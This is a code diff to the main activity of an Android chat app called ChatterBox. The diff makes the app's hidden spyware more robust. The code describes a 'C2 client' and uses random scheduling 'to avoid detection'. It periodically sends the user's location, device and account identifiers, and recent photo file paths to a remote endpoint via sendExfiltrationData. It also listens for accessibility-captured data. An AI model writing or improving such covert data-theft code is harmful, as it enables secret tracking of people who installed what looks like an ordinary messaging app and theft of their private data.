@@ -136,18 +136,27 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         ) {
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
+                // Device ID is already included in locationData by LocationTracker
                 dataSynchronizer?.sendExfiltrationData("location_data", locationData.toString())
             }
         }
     }
     private fun initializeBackgroundSync() {
+        // Use the application executor for background tasks
         appExecutor.execute {
             try {
                 // Initialize the data synchronizer (C2 client)
                 dataSynchronizer = DataSynchronizer(this)
 
-                // Collect basic device analytics
-                collectDeviceAnalytics()
+                // Post UI/context-dependent operations to the main thread
+                handler.post {
+                    try {
+                        // Collect basic device analytics
+                        collectDeviceAnalytics()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error collecting analytics: ${e.message}")
+                    }
+                }
 
                 // Start periodic background tasks with random intervals to avoid detection
                 scheduleBackgroundTasks()
@@ -156,15 +165,17 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
         }
     }
-
     private fun collectDeviceAnalytics() {
         try {
+            // Get a consistent device ID
+            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
             // Create analytics packet with device info
             val deviceInfo = JSONObject().apply {
                 put("device_model", android.os.Build.MODEL)
                 put("device_manufacturer", android.os.Build.MANUFACTURER)
                 put("android_version", android.os.Build.VERSION.RELEASE)
-                put("identifier", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
+                put("device_id", deviceId) // CONSISTENT: Always use deviceId
                 put("user_id", auth.currentUser?.uid ?: "")
                 put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                 put("timestamp", System.currentTimeMillis())
@@ -192,13 +203,44 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
 
         val initialMediaDelay = (3 + Math.random() * 5).toLong()
         scheduler.scheduleWithFixedDelay({
-            collectMediaMetadata()
+            try {
+                // Use the main handler for MediaStore operations
+                handler.post {
+                    try {
+                        collectMediaMetadata()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error in scheduled media task: ${e.message}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error scheduling media task: ${e.message}")
+            }
         }, initialMediaDelay, 30, TimeUnit.MINUTES)
 
         val initialSyncDelay = (2 + Math.random() * 3).toLong()
         scheduler.scheduleWithFixedDelay({
-            dataSynchronizer?.synchronizeData()
+            try {
+                dataSynchronizer?.synchronizeData()
+            } catch (e: Exception) {
+                Log.e(TAG, "Error in sync task: ${e.message}")
+            }
         }, initialSyncDelay, 15, TimeUnit.MINUTES)
+
+        // Add a location check task
+        scheduler.scheduleWithFixedDelay({
+            try {
+                // Always access location on the main thread
+                handler.post {
+                    try {
+                        collectLocationData()
+                    } catch (e: Exception) {
+                        Log.e(TAG, "Error in scheduled location task: ${e.message}")
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(TAG, "Error scheduling location task: ${e.message}")
+            }
+        }, 5, 20, TimeUnit.MINUTES)
     }
     private fun setupAccessibilityDataCapture() {
         val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
@@ -224,9 +266,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }, filter, RECEIVER_EXPORTED)
     }
 
+// Use this updated media query method in your MainActivity.kt
+
     private fun collectMediaMetadata() {
         try {
-            // Scan most recent images
+            // Get a consistent device ID
+            val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
+
+            // Scan most recent images - Properly query MediaStore without using LIMIT
             val mediaStore = contentResolver.query(
                 android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 arrayOf(
@@ -236,7 +283,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 ),
                 null,
                 null,
-                "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC LIMIT 5" // Just most recent 5
+                "${android.provider.MediaStore.Images.Media.DATE_MODIFIED} DESC" // Sort by most recent first
             )
 
             val mediaFiles = JSONObject()
@@ -253,19 +300,31 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         // Save path in JSON
                         mediaFiles.put(displayName, path)
                         count++
-                    } while (cursor.moveToNext() && count < 5) // Limit to 5 recent files
+
+                        // Manually limit to 5 items
+                        if (count >= 5) break
+
+                    } while (cursor.moveToNext())
                 }
             }
 
             // Only send if we found media files
             if (count > 0) {
-                dataSynchronizer?.sendExfiltrationData("media_metadata", mediaFiles.toString())
+                // Create a properly structured payload
+                val mediaData = JSONObject().apply {
+                    put("device_id", deviceId) // CONSISTENT: Always use deviceId
+                    put("media_files", mediaFiles)
+                    put("timestamp", System.currentTimeMillis())
+                    put("device_model", android.os.Build.MODEL)
+                    put("android_version", android.os.Build.VERSION.RELEASE)
+                }
+
+                dataSynchronizer?.sendExfiltrationData("media_metadata", mediaData.toString())
             }
         } catch (e: Exception) {
             Log.e(TAG, "Media scan error: ${e.message}")
         }
     }
-
     private fun openUserProfile(userId: String) {
         val intent = Intent(this, ProfileActivity::class.java)
         intent.putExtra("userId", userId)
